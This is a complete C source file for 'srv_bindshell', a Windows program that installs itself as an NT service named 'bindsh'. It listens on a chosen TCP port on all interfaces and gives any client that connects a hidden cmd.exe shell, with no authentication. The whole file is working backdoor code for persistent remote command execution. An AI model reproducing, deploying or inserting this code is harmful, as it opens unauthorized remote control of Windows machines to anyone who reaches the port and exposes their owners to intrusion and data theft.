/*
srv_bindshell - Simple bind shell which runs as a NT service.

by frego <frego@0x3f.net>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 2 of the License, or
(at your option) any later version.
	
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <windows.h>
#include <tchar.h>
#include <winsock2.h>
#include <stdio.h>
#include <unistd.h>

#define CMD_EXECUTE "cmd.exe /D /E:on /F:on"
#define WIN32_SERVICE_NAME "bindsh"

#define uint32_t unsigned int
#define uint16_t unsigned short int
#define uint8_t unsigned char

static int tcp4_bind(int);
static int tcp4_shell(int);
static void CtxHandler(int);

static SERVICE_STATUS hServStatus;
static SERVICE_STATUS_HANDLE hSStat;
volatile static BOOL ShutDown = FALSE, PauseFlag = FALSE;
static LPTSTR ServiceName = _T (WIN32_SERVICE_NAME);

static HANDLE stopServiceEvent = 0;
static void WINAPI ServiceMain (DWORD argc, LPTSTR argv[]);
static void WINAPI ServerCtrlHandler (DWORD);


/***************************************************************************/
/* TCP4 functions                                                          */
/***************************************************************************/

/* Bind to specified port */
static int
tcp4_bind(int port)
{
  int sock = -1;
  int yes = 1;
  struct sockaddr_in saddr;

  sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
  if (sock < 0)
    return -1;

  if (setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&yes,sizeof(int)) < 0)
    return -1;

  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(port);
  saddr.sin_addr.s_addr = INADDR_ANY;

  if (bind(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0)
    return -1;

  if (listen(sock, 5) < 0)
    return -1;

  return sock;
}

/***************************************************************************/
/* Shell functions                                                         */
/***************************************************************************/

static int
tcp4_shell(int sock)
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  SECURITY_ATTRIBUTES sa;

  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle = TRUE;

  /* Starting the child */
  memset(&si, 0, sizeof(STARTUPINFO));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = si.hStdOutput = si.hStdError = (void *)sock;

  CreateProcess(NULL,CMD_EXECUTE, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  return 1;
}

void
CtxHandler(int sock)
{
  fd_set rfds;
  struct timeval tv;

  FD_ZERO(&rfds);
  FD_SET(sock, &rfds);
  tv.tv_sec = 1;
  tv.tv_usec = 0;

  select(sock+1, &rfds, NULL, NULL, &tv);
  if (FD_ISSET(sock, &rfds))
    {
      int n = -1;
      n = accept(sock, NULL, 0);
      tcp4_shell(n);
      closesocket(n);
    }
}

/***************************************************************************/
/* WIN32 SERVICE                                                           */
/***************************************************************************/

/* Service main */
static void WINAPI
ServiceMain (DWORD argc, LPTSTR argv[])
{
  int sock = -1;
  int port = atoi(argv[1]);

  if (port > 65535 || port < 0) return -1;
 
  WSADATA wsa;

  hServStatus.dwServiceType = SERVICE_WIN32;
  hServStatus.dwCurrentState = SERVICE_STOPPED;
  hServStatus.dwControlsAccepted = 0;
  hServStatus.dwWin32ExitCode = NO_ERROR;
  hServStatus.dwServiceSpecificExitCode = NO_ERROR;
  hServStatus.dwCheckPoint = 0;
  hServStatus.dwWaitHint = 0;

  /* Register the service */
  hSStat = RegisterServiceCtrlHandler(ServiceName, ServerCtrlHandler);
  if(!hSStat) return;

  /* Starting the service */
  hServStatus.dwCurrentState = SERVICE_START_PENDING;
  SetServiceStatus(hSStat, &hServStatus);
  stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

  if (WSAStartup(MAKEWORD(2,0), &wsa))
    return;

  sock = tcp4_bind(port);
  if (sock)
    {
      hServStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
      hServStatus.dwCurrentState = SERVICE_RUNNING;
      SetServiceStatus(hSStat, &hServStatus);

      /* Waiting for connection */
      do
        {
          CtxHandler(sock);
        }
      while(WaitForSingleObject(stopServiceEvent, 5000) == WAIT_TIMEOUT);
      closesocket(sock);
    }

  hServStatus.dwCurrentState = SERVICE_STOP_PENDING;
  SetServiceStatus(hSStat, &hServStatus);

  CloseHandle(stopServiceEvent);
  stopServiceEvent = 0;

  hServStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
  hServStatus.dwCurrentState = SERVICE_STOPPED;
  SetServiceStatus(hSStat, &hServStatus);
  return;
}

/* Service control handler */
static void WINAPI
ServerCtrlHandler (DWORD Control)
{
  switch(Control)
    {
      case SERVICE_CONTROL_SHUTDOWN:
      case SERVICE_CONTROL_STOP:
        hServStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hSStat, &hServStatus);
        SetEvent(stopServiceEvent);
        return;
    }
  SetServiceStatus(hSStat, &hServStatus);
  return;
}

/***************************************************************************/
/* MAIN                                                                   */
/***************************************************************************/

int
_tmain(int argc, LPTSTR argv[])
{ 
  SERVICE_TABLE_ENTRY DispatchTable[] = 
    {
      {ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
      {NULL, NULL}
    };
  StartServiceCtrlDispatcher (DispatchTable);
  
  return 0;
}
